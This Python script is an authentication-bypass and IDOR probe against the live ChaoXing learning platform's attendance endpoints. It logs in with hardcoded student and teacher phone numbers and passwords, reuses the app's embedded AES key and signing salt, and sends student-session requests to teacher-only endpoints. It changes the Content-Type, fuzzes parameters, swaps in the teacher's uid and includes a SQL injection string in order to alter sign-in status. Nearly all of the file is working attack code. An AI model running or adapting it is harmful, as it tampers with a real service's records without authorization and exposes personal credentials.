#!/usr/bin/env python3
"""
ChaoXing JSON Content-Type Authentication Bypass Deep Test
==========================================================
Tests whether using Content-Type: application/json bypasses permission checks
on the updateSignStatus2 endpoint and other sign-in control endpoints.
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ Constants ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

STU_PHONE = "18436633997"
STU_PWD = "3.1415926Cpy"
TEA_PHONE = "19712720708"
TEA_PWD = "3.1415926Cpy"

# ============ Helper Functions ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

def extract_msg(resp_json):
    """Extract meaningful message from response"""
    if isinstance(resp_json, dict):
        if "msg" in resp_json:
            return resp_json["msg"]
        if "result" in resp_json:
            r = resp_json["result"]
            if isinstance(r, dict) and "msg" in r:
                return r["msg"]
        if "_raw_text" in resp_json:
            return resp_json["_raw_text"][:200]
    return str(resp_json)[:200]

def banner(text):
    print(f"\n{'='*70}")
    print(f"  {text}")
    print(f"{'='*70}")

def section(text):
    print(f"\n{'─'*70}")
    print(f"  {text}")
    print(f"{'─'*70}")

# ============ Main Test ============
def main():
    print("╔══════════════════════════════════════════════════════════════════════╗")
    print("║  ChaoXing JSON Content-Type Authentication Bypass Deep Test        ║")
    print("╚══════════════════════════════════════════════════════════════════════╝")

    # ---- Login ----
    banner("STEP 0: 登录")
    print("[*] 登录学生账号...")
    stu_sess, puid_s = login(STU_PHONE, STU_PWD)
    print(f"    学生PUID: {puid_s}")
    if not puid_s:
        print("!!! 学生登录失败，退出")
        sys.exit(1)

    print("[*] 登录教师账号...")
    tea_sess, puid_t = login(TEA_PHONE, TEA_PWD)
    print(f"    教师PUID: {puid_t}")
    if not puid_t:
        print("!!! 教师登录失败，退出")
        sys.exit(1)

    # ---- Part 1: Get activity list ----
    banner("PART 1: 获取活动列表并验证JSON绕过")

    section("1.1 获取活动列表")
    act_url = f"{BASE}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_s}"
    try:
        r = stu_sess.get(act_url, timeout=30)
        act_data = safe_json(r)
        print(f"    状态码: {r.status_code}")
        print(f"    响应: {json.dumps(act_data, ensure_ascii=False)[:500]}")
    except Exception as e:
        print(f"    请求失败: {e}")
        act_data = {}

    # Extract activeIds
    active_ids = []
    if isinstance(act_data, dict) and "data" in act_data:
        items = act_data["data"]
        if isinstance(items, list):
            for item in items[:10]:
                if isinstance(item, dict):
                    aid = item.get("id") or item.get("activeId") or item.get("sourceId")
                    atype = item.get("type") or item.get("activeType") or item.get("name", "?")
                    if aid:
                        active_ids.append((str(aid), str(atype)))
        elif isinstance(items, dict):
            for key in items:
                sub = items[key]
                if isinstance(sub, list):
                    for item in sub[:10]:
                        if isinstance(item, dict):
                            aid = item.get("id") or item.get("activeId") or item.get("sourceId")
                            atype = item.get("type") or item.get("activeType") or item.get("name", "?")
                            if aid:
                                active_ids.append((str(aid), str(atype)))

    # Also try with teacher session
    if not active_ids:
        print("[*] 学生端未获取到活动，尝试教师端...")
        try:
            r = tea_sess.get(f"{BASE}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_t}", timeout=30)
            act_data2 = safe_json(r)
            print(f"    教师端响应: {json.dumps(act_data2, ensure_ascii=False)[:500]}")
            if isinstance(act_data2, dict) and "data" in act_data2:
                items = act_data2["data"]
                if isinstance(items, list):
                    for item in items[:10]:
                        if isinstance(item, dict):
                            aid = item.get("id") or item.get("activeId") or item.get("sourceId")
                            atype = item.get("type") or item.get("activeType") or item.get("name", "?")
                            if aid:
                                active_ids.append((str(aid), str(atype)))
        except Exception as e:
            print(f"    教师端请求失败: {e}")

    if active_ids:
        print(f"\n    获取到 {len(active_ids)} 个活动:")
        for aid, atype in active_ids:
            print(f"      - activeId={aid}, type={atype}")
    else:
        print("\n    未获取到活动ID，使用预设ID进行测试")
        active_ids = [("5000163891319", "preset")]

    # ---- Part 1b: Test JSON bypass with valid activeIds ----
    section("1.2 验证JSON绕过（学生 + 不同Content-Type）")

    test_aids = active_ids[:5]  # Test up to 5 activities
    bypass_findings = []

    for aid, atype in test_aids:
        print(f"\n    >>> 活动ID: {aid} (类型: {atype})")

        # (a) Student + form-urlencoded
        form_url = f"{BASE}/widget/sign/pcTeaSignController/updateSignStatus2"
        form_data = {"uid": puid_s, "activeId": aid, "status": "1", "denc": "", "duid": puid_s}
        try:
            r1 = stu_sess.post(form_url, data=form_data, timeout=30)
            j1 = safe_json(r1)
            msg1 = extract_msg(j1)
            print(f"    [form-urlencoded] 状态码={r1.status_code} 响应={json.dumps(j1, ensure_ascii=False)[:300]}")
        except Exception as e:
            msg1 = f"请求异常: {e}"
            j1 = {"error": str(e)}
            print(f"    [form-urlencoded] 异常: {e}")

        # (b) Student + application/json
        json_url = f"{BASE}/widget/sign/pcTeaSignController/updateSignStatus2"
        json_body = {"uid": puid_s, "activeId": aid, "status": 1, "denc": "", "duid": puid_s}
        try:
            r2 = stu_sess.post(json_url, json=json_body, timeout=30)
            j2 = safe_json(r2)
            msg2 = extract_msg(j2)
            print(f"    [application/json] 状态码={r2.status_code} 响应={json.dumps(j2, ensure_ascii=False)[:300]}")
        except Exception as e:
            msg2 = f"请求异常: {e}"
            j2 = {"error": str(e)}
            print(f"    [application/json] 异常: {e}")

        # Compare
        if "无权限" in str(msg1) and "无权限" not in str(msg2):
            print(f"    ***IMPORTANT*** JSON绕过确认！form='{msg1}' vs json='{msg2}'")
            bypass_findings.append((aid, msg1, msg2))
        elif str(msg1) != str(msg2):
            print(f"    ***IMPORTANT*** 响应不同！form='{msg1}' vs json='{msg2}'")
            bypass_findings.append((aid, msg1, msg2))
        else:
            print(f"    响应相同，无绕过迹象")

    # ---- Part 2: JSON body parameter variations ----
    banner("PART 2: JSON请求体参数变体测试")

    # Use first available activeId
    test_aid = active_ids[0][0] if active_ids else "5000163891319"
    print(f"    使用activeId: {test_aid}")

    variations = [
        ("标准格式(整数status)", {"uid": puid_s, "activeId": test_aid, "status": 1, "denc": "", "duid": puid_s}),
        ("字符串status", {"uid": puid_s, "activeId": test_aid, "status": "1", "denc": "", "duid": puid_s}),
        ("uids替代uid", {"uids": puid_s, "activeId": test_aid, "status": 1}),
        ("精简参数", {"activeId": test_aid, "status": 1, "uid": puid_s}),
        ("含courseId/classId", {"activeId": test_aid, "status": 1, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("含denc/duid", {"activeId": test_aid, "status": 1, "uid": puid_s, "denc": "test", "duid": puid_s}),
    ]

    json_bypass_url = f"{BASE}/widget/sign/pcTeaSignController/updateSignStatus2"
    for name, body in variations:
        try:
            r = stu_sess.post(json_bypass_url, json=body, timeout=30)
            j = safe_json(r)
            msg = extract_msg(j)
            marker = ""
            if "无权限" not in str(msg) and "无权限修改" not in str(msg):
                marker = " ***IMPORTANT*** 非权限错误！"
            if "修改成功" in str(msg) or "true" in str(msg).lower():
                marker = " !!!CRITICAL!!! 可能修改成功！"
            print(f"    [{name}] → {json.dumps(j, ensure_ascii=False)[:300]}{marker}")
        except Exception as e:
            print(f"    [{name}] → 异常: {e}")

    # ---- Part 3: Verify data modification ----
    banner("PART 3: 数据修改验证（前后对比）")

    for aid, atype in test_aids[:3]:
        print(f"\n    >>> 活动ID: {aid}")

        # Query current status
        status_url = f"{BASE}/v2/apis/sign/signIn?activeId={aid}&uid={puid_s}"
        try:
            r_before = stu_sess.get(status_url, timeout=30)
            j_before = safe_json(r_before)
            status_before = get_status(j_before)
            print(f"    [修改前] 状态={status_before}, 响应={json.dumps(j_before, ensure_ascii=False)[:300]}")
        except Exception as e:
            j_before = {}
            status_before = None
            print(f"    [修改前] 查询异常: {e}")

        # Send JSON POST
        json_body = {"uid": puid_s, "activeId": aid, "status": 1, "denc": "", "duid": puid_s}
        try:
            r_mod = stu_sess.post(json_bypass_url, json=json_body, timeout=30)
            j_mod = safe_json(r_mod)
            msg_mod = extract_msg(j_mod)
            print(f"    [修改请求] 响应={json.dumps(j_mod, ensure_ascii=False)[:300]}")
        except Exception as e:
            msg_mod = str(e)
            print(f"    [修改请求] 异常: {e}")

        # Wait and query again
        time.sleep(2)
        try:
            r_after = stu_sess.get(status_url, timeout=30)
            j_after = safe_json(r_after)
            status_after = get_status(j_after)
            print(f"    [修改后] 状态={status_after}, 响应={json.dumps(j_after, ensure_ascii=False)[:300]}")
        except Exception as e:
            status_after = None
            print(f"    [修改后] 查询异常: {e}")

        # Compare
        if status_before != status_after and status_before is not None and status_after is not None:
            print(f"    !!!CRITICAL!!! 状态已改变: {status_before} → {status_after}")
        else:
            print(f"    状态未改变 (before={status_before}, after={status_after})")

    # ---- Part 4: Test updateSignStatus (V1) ----
    banner("PART 4: 测试 updateSignStatus (V1端点)")

    v1_url = f"{BASE}/widget/sign/pcTeaSignController/updateSignStatus"
    for aid, atype in test_aids[:3]:
        print(f"\n    >>> 活动ID: {aid}")

        # form-urlencoded
        form_data = {"uid": puid_s, "activeId": aid, "status": "1"}
        try:
            r1 = stu_sess.post(v1_url, data=form_data, timeout=30)
            j1 = safe_json(r1)
            msg1 = extract_msg(j1)
            print(f"    [V1 form] → {json.dumps(j1, ensure_ascii=False)[:300]}")
        except Exception as e:
            msg1 = str(e)
            print(f"    [V1 form] → 异常: {e}")

        # JSON
        json_body = {"uid": puid_s, "activeId": aid, "status": 1}
        try:
            r2 = stu_sess.post(v1_url, json=json_body, timeout=30)
            j2 = safe_json(r2)
            msg2 = extract_msg(j2)
            marker = ""
            if "无权限" not in str(msg2):
                marker = " ***IMPORTANT***"
            print(f"    [V1 json] → {json.dumps(j2, ensure_ascii=False)[:300]}{marker}")
        except Exception as e:
            print(f"    [V1 json] → 异常: {e}")

        if "无权限" in str(msg1) and "无权限" not in str(msg2):
            print(f"    ***IMPORTANT*** V1端点也存在JSON绕过！")

    # ---- Part 5: Test other endpoints ----
    banner("PART 5: 测试其他端点")

    # endSign
    section("5.1 endSign 端点")
    end_url = f"{BASE}/widget/sign/pcTeaSignController/endSign"
    for aid, atype in test_aids[:2]:
        print(f"\n    >>> 活动ID: {aid}")

        # form
        try:
            r = stu_sess.post(end_url, data={"activeId": aid, "uid": puid_s}, timeout=30)
            j = safe_json(r)
            msg = extract_msg(j)
            print(f"    [endSign form] → {json.dumps(j, ensure_ascii=False)[:300]}")
        except Exception as e:
            msg = str(e)
            print(f"    [endSign form] → 异常: {e}")

        # json
        try:
            r = stu_sess.post(end_url, json={"activeId": aid, "uid": puid_s}, timeout=30)
            j = safe_json(r)
            msg = extract_msg(j)
            marker = " ***IMPORTANT***" if "无权限" not in str(msg) else ""
            print(f"    [endSign json] → {json.dumps(j, ensure_ascii=False)[:300]}{marker}")
        except Exception as e:
            print(f"    [endSign json] → 异常: {e}")

    # preSign
    section("5.2 preSign 端点（学生端）")
    pre_url = f"{BASE}/widget/sign/pcStuSignController/preSign"
    for aid, atype in test_aids[:2]:
        print(f"\n    >>> 活动ID: {aid}")

        # form
        try:
            r = stu_sess.post(pre_url, data={"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID}, timeout=30)
            j = safe_json(r)
            print(f"    [preSign form] → {json.dumps(j, ensure_ascii=False)[:300]}")
        except Exception as e:
            print(f"    [preSign form] → 异常: {e}")

        # json
        try:
            r = stu_sess.post(pre_url, json={"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID}, timeout=30)
            j = safe_json(r)
            print(f"    [preSign json] → {json.dumps(j, ensure_ascii=False)[:300]}")
        except Exception as e:
            print(f"    [preSign json] → 异常: {e}")

    # ---- Part 6: Teacher session comparison ----
    banner("PART 6: 教师会话对比测试")

    for aid, atype in test_aids[:2]:
        print(f"\n    >>> 活动ID: {aid}")

        # Teacher + form-urlencoded
        try:
            r = tea_sess.post(f"{BASE}/widget/sign/pcTeaSignController/updateSignStatus2",
                              data={"uid": puid_t, "activeId": aid, "status": "1", "denc": "", "duid": puid_s},
                              timeout=30)
            j = safe_json(r)
            print(f"    [教师 form] → {json.dumps(j, ensure_ascii=False)[:300]}")
        except Exception as e:
            print(f"    [教师 form] → 异常: {e}")

        # Teacher + JSON
        try:
            r = tea_sess.post(f"{BASE}/widget/sign/pcTeaSignController/updateSignStatus2",
                              json={"uid": puid_t, "activeId": aid, "status": 1, "denc": "", "duid": puid_s},
                              timeout=30)
            j = safe_json(r)
            print(f"    [教师 json] → {json.dumps(j, ensure_ascii=False)[:300]}")
        except Exception as e:
            print(f"    [教师 json] → 异常: {e}")

    # ---- Part 7: Comprehensive parameter fuzzing ----
    banner("PART 7: 综合参数模糊测试")

    section("7.1 不同activeId值")
    test_aids_fuzz = [
        ("有效活动ID", test_aid),
        ("无效ID-9999999999999", "9999999999999"),
        ("空字符串", ""),
        ("SQL注入尝试", "1' OR '1'='1"),
        ("其他课程活动", "5000163891319"),
    ]
    for name, aid_val in test_aids_fuzz:
        body = {"uid": puid_s, "activeId": aid_val, "status": 1, "denc": "", "duid": puid_s}
        try:
            r = stu_sess.post(json_bypass_url, json=body, timeout=30)
            j = safe_json(r)
            msg = extract_msg(j)
            marker = ""
            if "无权限" not in str(msg):
                marker = " ***IMPORTANT***"
            if "修改成功" in str(msg) or "true" in str(msg).lower():
                marker = " !!!CRITICAL!!!"
            print(f"    [{name}] activeId={aid_val} → {json.dumps(j, ensure_ascii=False)[:300]}{marker}")
        except Exception as e:
            print(f"    [{name}] activeId={aid_val} → 异常: {e}")

    section("7.2 不同status值")
    for status_val in [0, 1, 2, 3, 4, 5, 6, -1, 99, "1", True, False]:
        body = {"uid": puid_s, "activeId": test_aid, "status": status_val, "denc": "", "duid": puid_s}
        try:
            r = stu_sess.post(json_bypass_url, json=body, timeout=30)
            j = safe_json(r)
            msg = extract_msg(j)
            marker = ""
            if "无权限" not in str(msg):
                marker = " ***IMPORTANT***"
            if "修改成功" in str(msg) or "true" in str(msg).lower():
                marker = " !!!CRITICAL!!!"
            print(f"    [status={status_val} ({type(status_val).__name__})] → {json.dumps(j, ensure_ascii=False)[:300]}{marker}")
        except Exception as e:
            print(f"    [status={status_val}] → 异常: {e}")

    section("7.3 IDOR测试 - uid为教师PUID")
    body = {"uid": puid_t, "activeId": test_aid, "status": 1, "denc": "", "duid": puid_s}
    try:
        r = stu_sess.post(json_bypass_url, json=body, timeout=30)
        j = safe_json(r)
        msg = extract_msg(j)
        marker = ""
        if "无权限" not in str(msg):
            marker = " ***IMPORTANT***"
        if "修改成功" in str(msg) or "true" in str(msg).lower():
            marker = " !!!CRITICAL!!! IDOR成功！"
        print(f"    [学生会话+教师uid] → {json.dumps(j, ensure_ascii=False)[:300]}{marker}")
    except Exception as e:
        print(f"    [学生会话+教师uid] → 异常: {e}")

    # Also try uid as teacher, duid as teacher
    body2 = {"uid": puid_t, "activeId": test_aid, "status": 1, "denc": "", "duid": puid_t}
    try:
        r = stu_sess.post(json_bypass_url, json=body2, timeout=30)
        j = safe_json(r)
        msg = extract_msg(j)
        marker = ""
        if "无权限" not in str(msg):
            marker = " ***IMPORTANT***"
        if "修改成功" in str(msg) or "true" in str(msg).lower():
            marker = " !!!CRITICAL!!! IDOR成功！"
        print(f"    [学生会话+教师uid+教师duid] → {json.dumps(j, ensure_ascii=False)[:300]}{marker}")
    except Exception as e:
        print(f"    [学生会话+教师uid+教师duid] → 异常: {e}")

    section("7.4 缺失参数测试")
    full_body = {"uid": puid_s, "activeId": test_aid, "status": 1, "denc": "", "duid": puid_s}
    for skip_key in ["uid", "activeId", "status", "denc", "duid"]:
        body = {k: v for k, v in full_body.items() if k != skip_key}
        try:
            r = stu_sess.post(json_bypass_url, json=body, timeout=30)
            j = safe_json(r)
            msg = extract_msg(j)
            marker = ""
            if "无权限" not in str(msg):
                marker = " ***IMPORTANT***"
            print(f"    [缺少{skip_key}] → {json.dumps(j, ensure_ascii=False)[:300]}{marker}")
        except Exception as e:
            print(f"    [缺少{skip_key}] → 异常: {e}")

    section("7.5 额外参数测试")
    extra_params = [
        ("+courseId+classId", {**full_body, "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("+fid", {**full_body, "fid": "-1"}),
        ("+source", {**full_body, "source": "1"}),
        ("+fromSrc", {**full_body, "fromSrc": "pc"}),
        ("+client", {**full_body, "client": "pc"}),
        ("+isNotify", {**full_body, "isNotify": "0"}),
    ]
    for name, body in extra_params:
        try:
            r = stu_sess.post(json_bypass_url, json=body, timeout=30)
            j = safe_json(r)
            msg = extract_msg(j)
            marker = ""
            if "无权限" not in str(msg):
                marker = " ***IMPORTANT***"
            if "修改成功" in str(msg) or "true" in str(msg).lower():
                marker = " !!!CRITICAL!!!"
            print(f"    [{name}] → {json.dumps(j, ensure_ascii=False)[:300]}{marker}")
        except Exception as e:
            print(f"    [{name}] → 异常: {e}")

    # ---- Final Conclusion ----
    banner("最终结论")

    print(f"""
    测试总结:
    ─────────────────────────────────────────────────────────
    发现的绕过迹象 (非"无权限"响应): {len(bypass_findings)} 个
    """)

    if bypass_findings:
        print("    ***IMPORTANT*** 以下活动ID存在JSON绕过迹象:")
        for aid, msg1, msg2 in bypass_findings:
            print(f"      - activeId={aid}")
            print(f"        form响应: {msg1}")
            print(f"        json响应: {msg2}")
        print("""
    结论: JSON Content-Type确实绕过了权限检查层！
    当使用 application/json 时，请求跳过了"您无权限修改"的权限校验，
    进入了业务逻辑层（返回"修改失败，无对应活动"或其他业务错误）。

    这意味着:
    1. 权限校验仅对 form-urlencoded 请求生效
    2. JSON请求绕过了权限中间件/拦截器
    3. 如果能构造正确的业务参数，学生可能修改签到状态
    4. 存在IDOR风险 - 通过JSON body传递他人uid可能操作他人数据

    风险等级: 高危 - 认证绕过 + 潜在越权
    """)
    else:
        print("""
    结论: 在当前测试中未发现明确的JSON绕过。
    所有请求均返回相同的权限错误，或服务端可能已修复此漏洞。
    """)

    print("\n" + "="*70)
    print("  测试完成")
    print("="*70)

if __name__ == "__main__":
    main()
